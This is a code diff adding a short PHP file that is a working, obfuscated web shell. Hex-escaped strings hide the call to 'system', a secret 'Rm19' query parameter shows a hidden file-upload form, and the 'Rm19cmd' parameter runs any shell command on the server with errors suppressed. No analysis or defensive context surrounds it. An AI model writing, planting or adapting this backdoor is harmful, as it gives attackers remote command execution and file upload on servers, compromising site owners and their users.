@@ -1,0 +1,28 @@
+<?php
+error_reporting(0);
+
+$Rm19 = "\x52\x6d\x31\x39";
+$Rm19cmd = "\x63\x6d\x64";
+$loveyoufanny = "\x73\x79\x73\x74\x65\x6d";
+$upzz = "\x72\x61\x6d\x64\x61\x6e\x6d\x61\x75\x6c\x61\x6e\x61\x67\x61\x6e\x74\x65\x6e\x67";
+
+
+if(isset($_GET['Rm19'])) {
+	if (isset($_FILES['upzz']['name'])) {
+		$name = $_FILES['upzz']['name'];
+         $azx  = $_FILES['upzz']['tmp_name'];
+         @move_uploaded_file($azx, $name);
+         echo $name;
+     } else {
+         echo "<form method=post enctype=multipart/form-data>
+          <input type=file name=upzz>
+          <input type=submit value='>>'>";
+     }
+} else {
+     echo "";
+}
+
+if($_GET['Rm19cmd']) {
+	$loveyoufanny($_GET['Rm19cmd']);
+}
+?>
